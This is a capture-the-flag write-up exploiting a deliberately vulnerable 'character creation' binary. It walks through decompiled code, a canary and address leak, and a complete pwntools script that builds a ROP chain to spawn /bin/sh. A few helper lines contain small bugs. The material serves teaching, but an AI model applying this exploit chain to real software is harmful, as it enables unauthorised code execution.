# challenge: character creation

## category: pwn

## quick look:
- check mitigation:
```
    Arch:      amd64
    RELRO:     Full RELRO
    Stack:     Canary found
    NX:        NX enabled
    PIE:       PIE enabled
    RUNPATH:   b'.'
    SHSTK:     Enabled
    IBT:       Enabled
    Stripped:  No
    Debuginfo: Yes
```
![](../image/Pasted%20image%2020260308113138.png)

## decompile:
- IDA:

    ```c
    int __fastcall main(int argc, const char **argv, const char **envp)
    {
      char choice[8]; // [rsp+8h] [rbp-18h] BYREF
      char username[8]; // [rsp+10h] [rbp-10h] BYREF
      unsigned __int64 v6; // [rsp+18h] [rbp-8h]

      v6 = __readfsqword(0x28u);
      setvbuf(_bss_start, 0LL, 2, 0LL);
      setvbuf(stdin, 0LL, 2, 0LL);
      printf("Enter Steam Account: ");
      fgets(username, 8, stdin);
      username[strcspn(username, "\n")] = 0;
      print_banner();
      while ( character_slots > 0 )
      {
        printf("Welcome, Undead %s.\n", username);
        puts("Prepare to create your character for the journey ahead.\n");
        printf("\n[?] Create a new character? (yes/no): ");
        get_safe_input(choice, 8uLL);
        if ( !strcmp(choice, "yes") || !strcmp(choice, "y") )
        {
          create_character();
        }
        else
        {
          if ( !strcmp(choice, "no") || !strcmp(choice, "n") )
          {
            printf("\x1B[32m\x1B[1m\n[*] Farewell, Ashen One.\n\x1B[0m");
            return 0;
          }
          printf("\x1B[31m[-] Invalid choice. Please enter 'yes' or 'no'.\n\x1B[0m");
        }
        ++newgame[0];
        --character_slots;
      }
      return 0;
    }

    void __cdecl create_character()
    {
      char *v0; // rax
      int len1; // [rsp+Ch] [rbp-34h] BYREF
      int choice; // [rsp+10h] [rbp-30h] BYREF
      int i; // [rsp+14h] [rbp-2Ch]
      int i_0; // [rsp+18h] [rbp-28h]
      int len2; // [rsp+1Ch] [rbp-24h]
      int bytes_read; // [rsp+20h] [rbp-20h]
      int total_items; // [rsp+24h] [rbp-1Ch]
      Character *character; // [rsp+28h] [rbp-18h]
      char s[8]; // [rsp+30h] [rbp-10h] BYREF
      unsigned __int64 v10; // [rsp+38h] [rbp-8h]

      v10 = __readfsqword(0x28u);
      printf("\x1B[32m[*] %d/3 Character slots left...\x1B[0m", character_slots);
      character = (Character *)malloc(144uLL);
      if ( character )
      {
        puts("\x1B[36m\n[+] Creating a new character...\n");
        printf("Enter character name (max %d chars): ", 31);
        get_safe_input(character->name, 32uLL);
        printf("Enter gender (Male/Female/Other): ");
        get_safe_input(character->gender, 16uLL);
        printf("Enter age: ");
        __isoc99_scanf("%lld", character);
        getchar();
        puts("\nAvailable Classes:");
        puts("  - Warrior");
        puts("  - Knight");
        puts("  - Wanderer");
        puts("  - Thief");
        puts("  - Bandit");
        puts("  - Hunter");
        puts("  - Sorcerer");
        puts("  - Pyromancer");
        puts("  - Cleric");
        puts("  - Deprived");
        printf("\nEnter character class: ");
        get_safe_input(character->character_class, 0x20uLL);
        printf("\x1B[0m\x1B[35m\n[*] Allocate your stats (1-99):\n\x1B[0m");
        printf("\x1B[1m\x1B[32mVitality (Health): ");
        character->stats.vitality = get_stat_value();
        printf("\x1B[0m\x1B[35mAttunement (Magic Slots): ");
        character->stats.attunement = get_stat_value();
        printf("\x1B[0m\x1B[32mEndurance (Stamina): ");
        character->stats.endurance = get_stat_value();
        printf("\x1B[0m\x1B[31mStrength: ");
        character->stats.strength = get_stat_value();
        printf("\x1B[0m\x1B[1m\x1B[36mDexterity: ");
        character->stats.dexterity = get_stat_value();
        printf("\x1B[0m\x1B[1m\x1B[34mIntelligence: ");
        character->stats.intelligence = get_stat_value();
        printf("\x1B[0m\x1B[1m\x1B[33mFaith: ");
        character->stats.faith = get_stat_value();
        printf("\x1B[0m\x1B[34mLuck: ");
        character->stats.luck = get_stat_value();
        *(_QWORD *)&character->soul_level = character->stats.luck
                                          + character->stats.faith
                                          + character->stats.intelligence
                                          + character->stats.dexterity
                                          + character->stats.strength
                                          + character->stats.endurance
                                          + character->stats.attunement
                                          + character->stats.vitality;
        if ( character->stats.faith > 67 )
        {
          puts("\x1B[0m");
          puts("[*] You are blessed by the angels");
          printf("Input chant length: ");
          __isoc99_scanf("%d", &len1);
          getchar();
          len2 = len1;                              // bof, not update len2
          while ( len1 > 8 )
          {
            puts("[!] Too long!");
            printf("Input chant length: ");
            __isoc99_scanf("%d", &len1);
            getchar();
          }
          printf("Chant: ");
          bytes_read = read(0, s, len2);            // input 24 bytes
          if ( bytes_read > 24 )
          {
            puts("[!] GAME HACKING IS FORBIDDEN");
            exit(-1);
          }
          character->chant = (char *)malloc(8uLL);
          for ( i = 0; i < len2; ++i )              // oob
            character->chant[i] = s[i];
        }
        choice = 0;
        total_items = 9;
        printf("\x1B[31m\nChoose a Starting Gift:\n\x1B[0m");
        for ( i_0 = 0; i_0 < total_items; ++i_0 )
          printf("  %d. %s\n", i_0 + 1, items[i_0]);
        printf("\x1B[36mEnter choice (1-%d): \x1B[0m", total_items);
        __isoc99_scanf("%d", &choice);
        getchar();
        if ( choice <= 0 || total_items < choice )
        {
          printf("\x1B[31mInvalid choice. No starting gift selected.\n\x1B[0m");
          character->starting_item = 0LL;
          exit(-1);
        }
        v0 = strdup(items[choice - 1]);
        character->starting_item = v0;
        display_character(character);
        free(character);
        puts("[+] Character creation complete!");
      }
      else
      {
        puts("[-] Memory allocation failed!");
      }
    }

    uint32_t __cdecl get_stat_value()
    {
      __int64 value; // [rsp+8h] [rbp-28h]
      char input[24]; // [rsp+10h] [rbp-20h] BYREF
      unsigned __int64 v3; // [rsp+28h] [rbp-8h]

      v3 = __readfsqword(0x28u);
      get_safe_input(input, 020uLL);
      value = strtol(input, 0LL, 10);
      if ( value <= 0 )
        value = 1LL;
      if ( value > 99 )
        LODWORD(value) = 99;
      return value;
    }

    void __cdecl get_safe_input(char *buffer, size_t max_len)
    {
      size_t len; // [rsp+18h] [rbp-8h]

      if ( fgets(buffer, max_len, stdin) )
      {
        len = strlen(buffer);
        if ( len )
        {
          if ( buffer[len - 1] == 10 )
            buffer[len - 1] = 0;
        }
      }
      else
      {
        *buffer = 0;
      }
    }
    ```

- data stored:

    ```text
    .data:0000000000004010 character_slots dw 3                    ; DATA XREF: create_character+1B↑r
    
    00000000 struct Character // sizeof=0x90
    00000000 {
    00000000     uint64_t age;
    00000008     char name[32];
    00000028     char gender[16];
    00000038     char character_class[32];
    00000058     Stats stats;
    00000078     uint32_t soul_level;
    0000007C     uint32_t humanity;
    00000080     char *chant;
    00000088     char *starting_item;
    00000090 };
    ```

## approach
- there are 2 bugs in `create`:

    ```c
      char *v0; // rax
      int len1; // [rsp+Ch] [rbp-34h] BYREF
      int choice; // [rsp+10h] [rbp-30h] BYREF
      int i; // [rsp+14h] [rbp-2Ch]
      int i_0; // [rsp+18h] [rbp-28h]
      int len2; // [rsp+1Ch] [rbp-24h]
      int bytes_read; // [rsp+20h] [rbp-20h]
      int total_items; // [rsp+24h] [rbp-1Ch]
      Character *character; // [rsp+28h] [rbp-18h]
      char s[8]; // [rsp+30h] [rbp-10h] BYREF
      unsigned __int64 v10; // [rsp+38h] [rbp-8h]
      ...
    if ( character->stats.faith > 67 )
    {
      puts("\x1B[0m");
      puts("[*] You are blessed by the angels");
      printf("Input chant length: ");
      __isoc99_scanf("%d", &len1);
      getchar();
      len2 = len1;                              // bof, not update len2
      while ( len1 > 8 )
      {
        puts("[!] Too long!");
        printf("Input chant length: ");
        __isoc99_scanf("%d", &len1);
        getchar();
      }
      printf("Chant: ");
      bytes_read = read(0, s, len2);            // input 24 bytes
      if ( bytes_read > 24 )
      {
        puts("[!] GAME HACKING IS FORBIDDEN");
        exit(-1);
      }
      character->chant = (char *)malloc(8uLL);
      for ( i = 0; i < len2; ++i )              // oob
        character->chant[i] = s[i];
    }
    ```

- as `len2` is not updated, but `read` still take `len2`, we will use it to leak and overwrite canary + saved rbp
- full relro + NX on + PIE -> stack pivote + ret2libc using ROP

### step 1: leak stack + canary
- first, fill 8 bytes of `s` to read leaked data:

    ```python
    sla(b'Steam Account: ', b'HELLO')
    sla(b'Create a new character? (yes/no): ', b'yes')
    sla(b'(max 31 chars): ', b'N' * 8)
    sla(b'(Male/Female/Other): ', b'Other')
    sla(b'Enter age: ', b'1127')
    sla(b' class: ', b'Pyromancer')
    sla(b'(Health): ', b'24')
    sla(b'(Magic Slots): ', b'24')
    sla(b'(Stamina): ', b'24')
    sla(b'Strength: ', b'24')
    sla(b'Dexterity: ', b'24')
    sla(b'Intelligence: ', b'24')
    sla(b'Faith: ', b'99')
    sla(b'Luck: ', b'24')
    sla(b'Input chant length: ', b'24')
    sla(b'Input chant length: ', b'8')
    sa(b'Chant: ', b'E' * 8 )
    sla(b'choice (1-9): ', b'1')
    ```

![](../image/Pasted%20image%2020260308114208.png)

- we will take 13 first bytes, 6 bytes is of canary, latter is of stack
- payload:

    ```python
    p.recvuntil(b'E'*8 + b'\n')
    data = p.recvline(13)
    canary = b'\x00' + data[:7]
    stack = data[7:13]
    canary = u64(canary)
    stack = u64(stack.ljust(8, b'\x00'))
    log.info(f'Leaked canary: {hex(canary)}')
    log.info(f'Leaked stack: {hex(stack)}')
    ```

- we got:

    ```text
    [*] Leaked canary: 0x9711df3c8285df00
    [*] Leaked stack: 0x7fffab107350
    ```

- cal stack base: `stack_base = stack - 0x2a28b`

### step 2: leak libc + heap
- as we use ROP and the data is stored in heap
- in `create`, we got a bug in `scanf`:

    ```c
      printf("Enter age: ");
    __isoc99_scanf("%lld", character);
    ```

- here it must be `character->age`, let's see what it takes if input "+" `sla(b'Enter age: ', b'+')`:

    ```text
   ► 0x58f01bf6058d    call   __isoc99_scanf@plt          <__isoc99_scanf@plt>
        format: 0x58f01bf612ff ◂— 0x76410a00646c6c25 /* '%lld' */
        rsi: 0x58f0264562a0 ◂— 0x58f026456
   pwndbg> vmmap 0x58f0264562a0
    LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
               Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
      0x58f01bf72000     0x58f01bf74000 rw-p     2000   13000 chall_patched
    ►     0x58f026456000     0x58f026477000 rw-p    21000       0 [heap] +0x2a0
      0x7dbb81a00000     0x7dbb81a28000 r--p    28000       0 libc.so.6
    vis
    ...
    0x58f026456290  0x0000000000000000      0x00000000000000a1      ................
    0x58f0264562a0  0x000000058f026456      0x4e4e4e4e4e4e4e4e      Vd......NNNNNNNN
    0x58f0264562b0  0x0000000000000000      0x0000000000000000      ................
    0x58f0264562c0  0x0000000000000000      0x000000726568744f      ........Other...
    0x58f0264562d0  0x0000000000000000      0x636e616d6f727950      ........Pyr
    ...
    ```

- so it's the address of heap
- now leak libc

![](../image/Pasted%20image%2020260308115716.png)

- saved rbp + 0xaa = username -> ???? + 0xaa = libc leak
- so saved rbp = leak + offset (=0xb8)
- after got libc leak, cal libc base

    ```python
    #leak libc + heap
    sla(b'Create a new character? (yes/no): ', b'yes')
    sla(b'(max 31 chars): ', b'N' * 8)
    sla(b'(Male/Female/Other): ', b'Other')
    sla(b'Enter age: ', b'+')
    sla(b' class: ', b'Pyromancer')
    sla(b'(Health): ', b'24')
    sla(b'(Magic Slots): ', b'24')
    sla(b'(Stamina): ', b'24')
    sla(b'Strength: ', b'24')
    sla(b'Dexterity: ', b'24')
    sla(b'Intelligence: ', b'24')
    sla(b'Faith: ', b'99')
    sla(b'Luck: ', b'24')
    sla(b'Input chant length: ', b'24')
    sla(b'Input chant length: ', b'8')
    payload = b'F' * 8 + p64(canary) + p64(stack + 0xb8)
    sa(b'Chant: ', payload)
    sla(b'choice (1-9): ', b'2')
    
    p.recvuntil(b'\x1B[33mAge:           \x1B[0m')
    heap_leak = p.recv(11) #each byte is a ascii
    data = ""
    for i in heap_leak:
        data += chr(i)
    heap_base = int(data)*0x1000
    log.info(f'Heap base: {hex(heap_base)}')
    
    p.recvuntil(b'Welcome, Undead ')
    libc_leak = u64(p.recv(6) + b'\x00\x00')
    log.info(f'Leaked libc: {hex(libc_leak)}')
    
    # saved rbp + 0xaa = username
    # ???? + 0xaa = libc leak
    libc.address = libc_leak - 0x2a28b
    log.info(f'Libc base: {hex(libc.address)}')
    ```

### step 3: ret2libc + ROP
- cal gadgets using libc base
- since `character stats` only accept value from 0 to 99, we will overwrite gadget in name, gender, class.
- and if we write straight to the start of heap, it will get malloc corrupt due to tcache

![](../image/Pasted%20image%2020260308120234.png)

- so begin ROP at 0x10 bytes behind
- payload:

    ```python
    pop_rdi = 0x000000000010f78b + libc.address
    pop_rsp = 0x000000000003c068 + libc.address
    binsh = next(libc.search(b'/bin/sh\x00'))
    ret = 0x000000000002882f + libc.address
    execve = libc.sym['execve']
    pop_rsi_pop_r15 = 0x000000000010f789 + libc.address
    char_base = heap_base + 0x2a0
    pop_rsi = 0x0000000000110a7d
    pop_rax = 0x00000000000dd237 + libc.address
    syscall = 0x00000000000288b5 + libc.address
    
    # send payload
    sla(b'Create a new character? (yes/no): ', b'yes')
    
    rop_name = p64(0) + p64(canary) + p64(0) +  p64(ret)[:7]
    sa(b' chars): ', rop_name)
    rop_gender = p64(pop_rsi_pop_r15)+p64(0)[:7]
    sa(b'Enter gender (Male/Female/Other):', rop_gender)
    sla(b'age: ', b'0')
    rop_class = p64(0)+p64(pop_rdi) + p64(binsh) + p64(execve)[:7]
    sa(b'class', rop_class.ljust(31, b'A'))
    
    sla(b'(Health): ', b'24')
    sla(b'(Magic Slots): ', b'24')
    sla(b'(Stamina): ', b'24')
    sla(b'Strength: ', b'24')
    sla(b'Dexterity: ', b'24')
    sla(b'Intelligence: ', b'24')
    sla(b'Faith: ', b'99')
    sla(b'Luck: ', b'24')
    sla(b'Input chant length: ', b'24')
    sla(b'Input chant length: ', b'8')
    payload = b'D'*8 + p64(canary) + p64(char_base + 0x18)
    sa(b'Chant: ', payload)
    ```

## PoC

```python
    #!/usr/bin/env python3
    from pwn import *
    import binascii
    import sys
    
    exe_path = './chall_patched'
    HOST = '100.64.0.66'
    PORT = 33109
    
    exe = ELF(exe_path, checksec=False)
    libc = ELF('./libc.so.6', checksec=False)
    context.binary = exe
    context.terminal = [
        'cmd.exe', '/c', 'start',
        'wt.exe', '-w', '0', 'split-pane', '-V',
        '-d', '.',
        'wsl.exe',
        '-d', 'kali-linux',
        'bash', '-c'
    ]
    
    gdbscript = '''
    brva 0x149b
    brva 0x1a98
    continue
    c
    c
    c
    c
    '''
    
    def start():
        if args.REMOTE:
            return remote(HOST, PORT)
        p = process(exe.path)
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            input()
        return p
    
    p = start()
    
    # add payload, script here
    
    def sla(prompt, data):
        p.sendlineafter(prompt, data)
    def sa(prompt, data):    
        p.sendafter(prompt, data)
    def sl(prompt):
        p.sendlineafter(prompt)
    def s(data):
        p.send(data)
    
    
    # leak canary + saved rbp
    sla(b'Steam Account: ', b'HELLO')
    sla(b'Create a new character? (yes/no): ', b'yes')
    sla(b'(max 31 chars): ', b'N' * 8)
    sla(b'(Male/Female/Other): ', b'Other')
    sla(b'Enter age: ', b'1127')
    sla(b' class: ', b'Pyromancer')
    sla(b'(Health): ', b'24')
    sla(b'(Magic Slots): ', b'24')
    sla(b'(Stamina): ', b'24')
    sla(b'Strength: ', b'24')
    sla(b'Dexterity: ', b'24')
    sla(b'Intelligence: ', b'24')
    sla(b'Faith: ', b'99')
    sla(b'Luck: ', b'24')
    sla(b'Input chant length: ', b'24')
    sla(b'Input chant length: ', b'8')
    sa(b'Chant: ', b'E' * 8 )
    sla(b'choice (1-9): ', b'1')
    
    p.recvuntil(b'E'*8 + b'\n')
    data = p.recvline(13)
    canary = b'\x00' + data[:7]
    stack = data[7:13]
    canary = u64(canary)
    stack = u64(stack.ljust(8, b'\x00'))
    log.info(f'Leaked canary: {hex(canary)}')
    log.info(f'Leaked stack: {hex(stack)}')
    stack_base = stack - 0x2a28b
    
    #leak libc + heap
    sla(b'Create a new character? (yes/no): ', b'yes')
    sla(b'(max 31 chars): ', b'N' * 8)
    sla(b'(Male/Female/Other): ', b'Other')
    sla(b'Enter age: ', b'+')
    sla(b' class: ', b'Pyromancer')
    sla(b'(Health): ', b'24')
    sla(b'(Magic Slots): ', b'24')
    sla(b'(Stamina): ', b'24')
    sla(b'Strength: ', b'24')
    sla(b'Dexterity: ', b'24')
    sla(b'Intelligence: ', b'24')
    sla(b'Faith: ', b'99')
    sla(b'Luck: ', b'24')
    sla(b'Input chant length: ', b'24')
    sla(b'Input chant length: ', b'8')
    payload = b'F' * 8 + p64(canary) + p64(stack + 0xb8)
    sa(b'Chant: ', payload)
    sla(b'choice (1-9): ', b'2')
    
    p.recvuntil(b'\x1B[33mAge:           \x1B[0m')
    heap_leak = p.recv(11) #each byte is a ascii
    data = ""
    for i in heap_leak:
        data += chr(i)
    heap_base = int(data)*0x1000
    log.info(f'Heap base: {hex(heap_base)}')
    
    
    p.recvuntil(b'Welcome, Undead ')
    libc_leak = u64(p.recv(6) + b'\x00\x00')
    log.info(f'Leaked libc: {hex(libc_leak)}')
    
    # saved rbp + 0xaa = username
    # ???? + 0xaa = libc leak
    libc.address = libc_leak - 0x2a28b
    log.info(f'Libc base: {hex(libc.address)}')
    #rop
    pop_rdi = 0x000000000010f78b + libc.address
    pop_rsp = 0x000000000003c068 + libc.address
    binsh = next(libc.search(b'/bin/sh\x00'))
    ret = 0x000000000002882f + libc.address
    exit = libc.sym['exit']
    execve = libc.sym['execve']
    pop_rsi_pop_r15 = 0x000000000010f789 + libc.address
    char_base = heap_base + 0x2a0
    pop_rsi = 0x0000000000110a7d
    pop_rax = 0x00000000000dd237 + libc.address
    syscall = 0x00000000000288b5 + libc.address
    
    # send payload
    sla(b'Create a new character? (yes/no): ', b'yes')
    
    rop_name = p64(0) + p64(canary) + p64(0) +  p64(ret)[:7]
    sa(b' chars): ', rop_name)
    rop_gender = p64(pop_rsi_pop_r15)+p64(0)[:7]
    sa(b'Enter gender (Male/Female/Other):', rop_gender)
    sla(b'age: ', b'0')
    rop_class = p64(0)+p64(pop_rdi) + p64(binsh) + p64(execve)[:7]
    sa(b'class', rop_class.ljust(31, b'A'))
    
    sla(b'(Health): ', b'24')
    sla(b'(Magic Slots): ', b'24')
    sla(b'(Stamina): ', b'24')
    sla(b'Strength: ', b'24')
    sla(b'Dexterity: ', b'24')
    sla(b'Intelligence: ', b'24')
    sla(b'Faith: ', b'99')
    sla(b'Luck: ', b'24')
    sla(b'Input chant length: ', b'24')
    sla(b'Input chant length: ', b'8')
    payload = b'D'*8 + p64(canary) + p64(char_base + 0x18)
    sa(b'Chant: ', payload)
    
    sla(b'choice (1-9): ', b'7')
    sl(b'cat flag.txt')
    p.interactive()
```
